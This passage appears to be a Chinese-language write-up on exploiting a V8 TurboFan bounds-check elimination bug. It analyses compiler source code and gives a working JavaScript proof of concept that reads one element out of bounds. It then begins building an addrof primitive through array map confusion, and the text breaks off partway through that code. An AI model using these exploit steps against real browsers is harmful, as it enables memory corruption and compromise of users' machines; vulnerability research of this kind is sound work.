@@ -1,0 +1,237 @@
+      DisallowHeapAccess no_heap_access;
+      // Check if the output type is a singleton.  In that case we already know the
+      // result value and can simply replace the node if it's eliminable.
+      if (!NodeProperties::IsConstant(node) && NodeProperties::IsTyped(node) &&
+          node->op()->HasProperty(Operator::kEliminatable)) {
+        // TODO(v8:5303): We must not eliminate FinishRegion here. This special
+        // case can be removed once we have separate operators for value and
+        // effect regions.
+        if (node->opcode() == IrOpcode::kFinishRegion) return NoChange();
+        // We can only constant-fold nodes here, that are known to not cause any
+        // side-effect, may it be a JavaScript observable side-effect or a possible
+        // eager deoptimization exit (i.e. {node} has an operator that doesn't have
+        // the Operator::kNoDeopt property).
+        Type upper = NodeProperties::GetType(node);
+        if (!upper.IsNone()) {
+          Node* replacement = nullptr;
+          if (upper.IsHeapConstant()) {
+            replacement = jsgraph()->Constant(upper.AsHeapConstant()->Ref());
+     //[...]         
+          if (replacement) {
+            // Make sure the node has a type.
+            if (!NodeProperties::IsTyped(replacement)) {
+              NodeProperties::SetType(replacement, upper);
+            }
+            ReplaceWithValue(node, replacement);
+            return Changed(replacement);
+          }
+        }
+      }
+      return NoChange();
+    }
+因此，想要触发`OOB`必须规避掉以上路径。可以从`43`节点和`16`节点两方面考虑。首先说`16`节点，其来自于`41`节点的优化
+    - In-place update of 41: LoadField[tagged base, 24, Range(0, 134217726), kRepTaggedSigned|kTypeInt32, NoWriteBarrier, mutable](68, 17, 12) by reducer RedundancyElimination
+    - Replacement of 41: LoadField[tagged base, 24, Range(0, 134217726), kRepTaggedSigned|kTypeInt32, NoWriteBarrier, mutable](68, 17, 12) with 16: NumberConstant[4] by reducer LoadElimination
+当`op`搜索的参数`field_index`不是`0`时，到相应的`object`中找到相关偏移的节点代替掉这个`LoadField`节点，可见这个就是直接取出了要访问`element`的长度，似乎无法改变。
+    Reduction LoadElimination::ReduceLoadField(Node* node,
+                                               FieldAccess const& access) {
+      Node* object = NodeProperties::GetValueInput(node, 0);
+      Node* effect = NodeProperties::GetEffectInput(node);
+      Node* control = NodeProperties::GetControlInput(node);
+      AbstractState const* state = node_states_.Get(effect);
+      if (state == nullptr) return NoChange();
+      if (access.offset == HeapObject::kMapOffset &&
+    //[...]
+      } else {
+        int field_index = FieldIndexOf(access);
+        if (field_index >= 0) {
+          PropertyConstness constness = access.constness;
+          MachineRepresentation representation =
+              access.machine_type.representation();
+          FieldInfo const* lookup_result =
+              state->LookupField(object, field_index, constness);
+          if (!lookup_result && constness == PropertyConstness::kConst) {
+            lookup_result = state->LookupField(object, field_index,
+                                               PropertyConstness::kMutable);
+          }
+          if (lookup_result) {
+            // Make sure we don't reuse values that were recorded with a different
+            // representation or resurrect dead {replacement} nodes.
+            Node* replacement = lookup_result->value;
+            if (IsCompatible(representation, lookup_result->representation) &&
+                !replacement->IsDead()) {
+              // Introduce a TypeGuard if the type of the {replacement} node is not
+              // a subtype of the original {node}'s type.
+              if (!NodeProperties::GetType(replacement)
+                       .Is(NodeProperties::GetType(node))) {
+                Type replacement_type = Type::Intersect(
+                    NodeProperties::GetType(node),
+                    NodeProperties::GetType(replacement), graph()->zone());
+                replacement = effect =
+                    graph()->NewNode(common()->TypeGuard(replacement_type),
+                                     replacement, effect, control);
+                NodeProperties::SetType(replacement, replacement_type);
+              }
+              ReplaceWithValue(node, replacement, effect);
+              return Replace(replacement);
+            }
+          }
+          FieldInfo info(node, access.name, representation);
+          state = state->AddField(object, field_index, info, constness, zone());
+        }
+      }
+      Handle field_map;
+      if (access.map.ToHandle(&field_map)) {
+        state = state->SetMaps(node, ZoneHandleSet(field_map), zone());
+      }
+      return UpdateState(node, state);
+    }
+而另一节点`43 typer`的路径如下：
+    Reduction Reduce(Node* node) override {
+        if (node->op()->ValueOutputCount() == 0) return NoChange();
+        switch (node->opcode()) {
+    #define DECLARE_CASE(x) \
+      case IrOpcode::k##x:  \
+        return UpdateType(node, TypeBinaryOp(node, x##Typer));
+          JS_SIMPLE_BINOP_LIST(DECLARE_CASE)
+    #undef DECLARE_CASE
+    #define DECLARE_CASE(x) \
+      case IrOpcode::k##x:  \
+        return UpdateType(node, Type##x(node));
+          DECLARE_CASE(Start)
+          DECLARE_CASE(IfException)
+          // VALUE_OP_LIST without JS_SIMPLE_BINOP_LIST:
+          COMMON_OP_LIST(DECLARE_CASE)
+          SIMPLIFIED_COMPARE_BINOP_LIST(DECLARE_CASE)
+          SIMPLIFIED_OTHER_OP_LIST(DECLARE_CASE) // [here]
+`SIMPLIFIED_OTHER_OP_LIST`定义如下
+    #define SIMPLIFIED_OTHER_OP_LIST(V)     \
+    // [...]
+      V(CheckBounds)                        \
+      V(CheckIf)                            \
+因此这个分支就变成了
+    case IrOpcode::kCheckBounds:  \
+        return UpdateType(node, TypeCheckBounds(node));
+`TypeCheckBounds`定义如下，取第一个和第二个输入节点的类型，调用`CheckBounds`
+    Type Typer::Visitor::TypeCheckBounds(Node* node) {
+      return typer_->operation_typer_.CheckBounds(Operand(node, 0),
+                                                  Operand(node, 1));
+    }
+`CheckBounds`定义如下，显然`index`是一个实际的范围，而`length`负责控制其最大边界，而最终取`index`与`mask`的交集。
+    Type OperationTyper::CheckBounds(Type index, Type length) {
+      DCHECK(length.Is(cache_->kPositiveSafeInteger));
+      if (length.Is(cache_->kSingletonZero)) return Type::None();
+      Type mask = Type::Range(0.0, length.Max() - 1, zone());
+      if (index.Maybe(Type::MinusZero())) {
+        index = Type::Union(index, cache_->kSingletonZero, zone());
+      }
+      return Type::Intersect(index, mask, zone());
+    }
+    Type Type::Intersect(Type type1, Type type2, Zone* zone) {
+      // Fast case: bit sets.
+      if (type1.IsBitset() && type2.IsBitset()) {
+        return NewBitset(type1.AsBitset() & type2.AsBitset());
+      }
+      // Fast case: top or bottom types.
+      if (type1.IsNone() || type2.IsAny()) return type1;  // Shortcut.
+      if (type2.IsNone() || type1.IsAny()) return type2;  // Shortcut.
+      // Semi-fast case.
+      if (type1.Is(type2)) return type1;
+      if (type2.Is(type1)) return type2;
+      // Slow case: create union.
+      // Semantic subtyping check - this is needed for consistency with the
+      // semi-fast case above.
+      if (type1.Is(type2)) {
+        type2 = Any();
+      } else if (type2.Is(type1)) {
+        type1 = Any();
+      }
+      bitset bits = type1.BitsetGlb() & type2.BitsetGlb();
+      int size1 = type1.IsUnion() ? type1.AsUnion()->Length() : 1;
+      int size2 = type2.IsUnion() ? type2.AsUnion()->Length() : 1;
+      int size;
+      if (base::bits::SignedAddOverflow32(size1, size2, &size)) return Any();
+      if (base::bits::SignedAddOverflow32(size, 2, &size)) return Any();
+      UnionType* result = UnionType::New(size, zone);
+      size = 0;
+      // Deal with bitsets.
+      result->Set(size++, NewBitset(bits));
+      RangeType::Limits lims = RangeType::Limits::Empty();
+      size = IntersectAux(type1, type2, result, size, &lims, zone);
+      // If the range is not empty, then insert it into the union and
+      // remove the number bits from the bitset.
+      if (!lims.IsEmpty()) {
+        size = UpdateRange(Type::Range(lims, zone), result, size, zone);
+        // Remove the number bits.
+        bitset number_bits = BitsetType::NumberBits(bits);
+        bits &= ~number_bits;
+        result->Set(0, NewBitset(bits));
+      }
+      return NormalizeUnion(result, size, zone);
+    }
+对于测试`demo`，其`0、1`两个节点的范围如下：
+显然就是取[4,4]和[0,2147483646]的交集，因此`CheckBounds`的`typer`结果是[4,4]。最终导致满足`uintlessthan`的优化条件`left_type.Min()
+>= right_type.Max()`，被优化成永假。
+## poc构造
+综上，分析了测试样例不能触发`OOB`的原因，首先要想办法绕过`loadelimination`阶段对`loadelement`节点的消除。
+可以发现一个显然的途径是在`CheckBounds`的`typer`阶段做文章，如果让`CheckBounds`节点的范围并非单一值而是一个范围，保证最小值小于要访问`element`的范围，就不会满足消除的条件`(left_type.Min()
+>= right_type.Max())`，而核心问题是对第一个输入的节点范围的扩展，因为`CheckBounds`的范围基本由此确定。
+长亭发表的一篇[writeup](https://zhuanlan.zhihu.com/p/73081003)中提到了两种解决方案，第一种是对`index`增加一个`and`操作`idx
+&= 0xfff;`，这种方法会在原来`NumberConstant[4]`下面增加一个`SpeculativeNumberBitwiseAnd`节点。
+而这个节点的`typer`实现如下：
+    Type OperationTyper::NumberBitwiseAnd(Type lhs, Type rhs) {
+      DCHECK(lhs.Is(Type::Number()));
+      DCHECK(rhs.Is(Type::Number()));
+      lhs = NumberToInt32(lhs);
+      rhs = NumberToInt32(rhs);
+      if (lhs.IsNone() || rhs.IsNone()) return Type::None();
+      double lmin = lhs.Min();
+      double rmin = rhs.Min();
+      double lmax = lhs.Max();
+      double rmax = rhs.Max();
+      double min = kMinInt;
+      // And-ing any two values results in a value no larger than their maximum.
+      // Even no larger than their minimum if both values are non-negative.
+      double max =
+          lmin >= 0 && rmin >= 0 ? std::min(lmax, rmax) : std::max(lmax, rmax);
+      // And-ing with a non-negative value x causes the result to be between
+      // zero and x.
+      if (lmin >= 0) {
+        min = 0;
+        max = std::min(max, lmax);
+      }
+      if (rmin >= 0) {
+        min = 0;
+        max = std::min(max, rmax);
+      }
+      return Type::Range(min, max, zone());
+    }
+其中`lmin、lmax`为`255`，`rmin、rmax`为`4`，因此最终该节点的范围`(0,4)`，传递至`CheckBounds`节点并不满足这消除条件，可以触发漏洞。
+第二种，由于逃逸分析阶段在`LoadElimination`后一阶段，因此在`typer`时，无法直接分析出从`array`中取出的`index`具体值，只能将其分析为`Signed32`，最终`CheckBounds`的范围为`(0,2147483646)`
+此外，还可以利用`Phi`节点来达到同样的目的，当某个值存在分支时，`Turbofan`会将增加一个`phi`节点，并将这两个值都加入节点的范围去传递，那么`poc`同样可以这样构造
+    var opt_me = (x) => {
+      let arr = [1,2,3,4.1];
+      let index = 0;
+      if(x = 'p4nda')
+        index = 4;
+      return arr[index];
+    };
+    for (var i = 0; i < 0x10000; ++i)
+      opt_me('test');
+    console.log(opt_me('p4nda'));
+则构造的`IR`图如下
+执行结果如下：
+    # p4nda @ ubuntu in ~/chromium/v8/v8/out.gn/x64.debug/log on git:749f0727a2 x [10:39:33] C:130
+    $ ../d8 ./test.js                                                                                                      
+    -1.1885946300594787e+148
+## addrof原语构造
+现在在`element`上存在一个`off-by-one`。对于一个`JSArray`，其数据结构本身与`element`内存分布存在两种布局，一种是`elememt`在低地址，一般用`var a =
+[1.1,1.2,1.3]`这样的方式构建；另一种是`element`在高地址，一般用`var a =
+Array(4)`这样的方式构建。由于二者内存位置紧邻，因此，可以通过`off-by-one`泄露或者修改一个对象的`map`地址，从而造成`type
+confuse`。
+一个简单的想法就是将一个存放了`obj`的`JSArray`的`map`改为全部存放`double`类型的`JSArray map`。
+首先泄露比较简单，利用之前的`poc`可以将`arr`的`map`，并将`arr`加入一个全局的`Array`防止`map`被释放。
+    function get_map_opt(x){
+            let arr = [1.1,1.2,1.3,1.4];
+            let arr_ele = [arr,arr,arr,arr];
+            let index = 0;
